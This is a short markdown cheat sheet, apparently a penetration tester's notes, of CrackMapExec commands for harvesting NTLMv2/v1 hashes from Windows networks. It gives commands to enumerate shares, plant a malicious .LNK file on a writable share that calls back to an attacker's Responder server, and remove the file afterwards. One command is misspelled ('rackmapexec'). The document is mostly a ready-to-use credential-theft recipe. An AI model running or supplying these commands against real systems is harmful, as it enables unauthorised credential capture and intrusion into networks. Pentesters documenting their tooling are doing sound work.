# CrackMapExec Examples

**Description:** Examples of CrackMapExec commands that I use throughout penetration tests.

## Harvest NTLMv2/v1 credentials if you have write-access to a share. 

Enumerate the hosts shares \
```crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] --shares```

Create a malicious .LNK file calling back to your Responder.py IP \
```crackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP]```

After waiting and (hopefully) obtaining several NTLM hashes, cleanup the malicious file \
```rackmapexec smb [TARGET] -u [USERNAME] -p [PASSWORD] -M slinky -o NAME=[SHARE] SERVER=[ResponderIP] CLEANUP=True```

## References
* [Harvest_NTLM_with_Slinky](https://twitter.com/mpgn_x64/status/1453018750253424643)
